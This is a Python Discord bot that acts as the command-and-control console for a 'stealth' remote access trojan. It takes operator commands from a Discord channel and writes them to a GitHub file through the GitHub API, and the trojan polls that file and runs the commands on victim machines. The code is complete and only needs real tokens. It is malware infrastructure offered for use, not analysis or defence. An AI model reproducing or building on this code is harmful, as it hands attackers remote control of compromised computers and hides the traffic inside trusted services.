import discord
from discord.ext import commands
import os
import requests
import json

# --- C2 Configuration (Must match the C++ RAT's configuration) ---
# IMPORTANT: REPLACE THESE PLACEHOLDERS
BOT_TOKEN = "DISCORD_BOT_TOKEN_GOES_HERE" 
TARGET_CHANNEL_ID = 123456789012345678  # Replace with the ID of your C2 Channel (must be an integer)
GITHUB_COMMAND_FILE_URL = "https://api.github.com/repos/L0VE/cmds/contents/cmd.txt" 
GITHUB_TOKEN = "YOUR_GITHUB_PAT_FOR_WRITING_GOES_HERE" # Personal Access Token required to push updates

# --- Bot Setup ---
# Set command prefix
bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())

# Function to conceptually update the GitHub file content
# NOTE: In a real scenario, this requires a GitHub Personal Access Token (PAT) 
# with 'repo' scope and handling of file SHAs. 
def update_github_command_file(new_command):
    """
    Sends the new command to the GitHub file via API, replacing its content.
    The C++ RAT will read this raw file content.
    """
    if not GITHUB_TOKEN or GITHUB_TOKEN == "YOUR_GITHUB_PAT_FOR_WRITING_GOES_HERE":
        print("ERROR: GitHub PAT not configured. Cannot update command file.")
        return False, "Error: GitHub PAT missing."

    # --- Step 1: Get the current SHA (needed to update the file) ---
    try:
        headers = {
            "Authorization": f"token {GITHUB_TOKEN}",
            "Accept": "application/vnd.github.v3+json"
        }
        response = requests.get(GITHUB_COMMAND_FILE_URL, headers=headers)
        response.raise_for_status()
        
        file_data = response.json()
        current_sha = file_data['sha']
        
    except requests.exceptions.RequestException as e:
        print(f"Error fetching SHA from GitHub: {e}")
        return False, f"Error: Failed to fetch file SHA ({e})."

    # --- Step 2: Update the file content ---
    # The command must be base64 encoded for the GitHub API, but since 
    # we are just writing a raw command (text), we just include the new command
    # and the required SHA.
    
    # We are using Base64 encoding for the content parameter as required by GitHub API
    import base64
    encoded_content = base64.b64encode(new_command.encode('utf-8')).decode('utf-8')
    
    payload = {
        "message": f"Issued command: {new_command}",
        "content": encoded_content,
        "sha": current_sha
    }

    try:
        response = requests.put(GITHUB_COMMAND_FILE_URL, headers=headers, data=json.dumps(payload))
        response.raise_for_status()
        return True, "Command successfully written to GitHub file."
    except requests.exceptions.RequestException as e:
        print(f"Error updating GitHub file: {e}")
        return False, f"Error: Failed to update file ({e})."


# --- Bot Events and Commands ---

@bot.event
async def on_ready():
    """Confirms the bot is connected and ready to accept commands."""
    print(f'Logged in as {bot.user.name} ({bot.user.id})')
    await bot.change_presence(activity=discord.Game(name="Command & Control Ready"))
    
    # Simple check to ensure we are in the right channel
    if not bot.get_channel(TARGET_CHANNEL_ID):
        print(f"ERROR: Channel ID {TARGET_CHANNEL_ID} not found or inaccessible.")


@bot.command(name='issue_cmd', help='Issues a command to the stealth RAT via GitHub C2.')
async def issue_cmd(ctx, *, command_to_run):
    """
    Listens for '!issue_cmd <command>' and pushes the command to the GitHub file.
    The C++ RAT will execute this command on its next poll cycle.
    """
    if ctx.channel.id != TARGET_CHANNEL_ID:
        # Ignore commands outside the designated C2 channel
        return

    await ctx.send(f"[*] Issuing command: `{command_to_run}` to GitHub C2...")
    
    success, message = update_github_command_file(command_to_run)
    
    if success:
        await ctx.send(f"[+] Command queued. Target should execute within 15-30 seconds. ({message})")
    else:
        await ctx.send(f"[-] FAILED to queue command. Check console for details. ({message})")

# --- Run the Bot ---
try:
    bot.run(BOT_TOKEN)
except Exception as e:
    print(f"FATAL ERROR: Failed to start Discord bot. Check BOT_TOKEN. Error: {e}")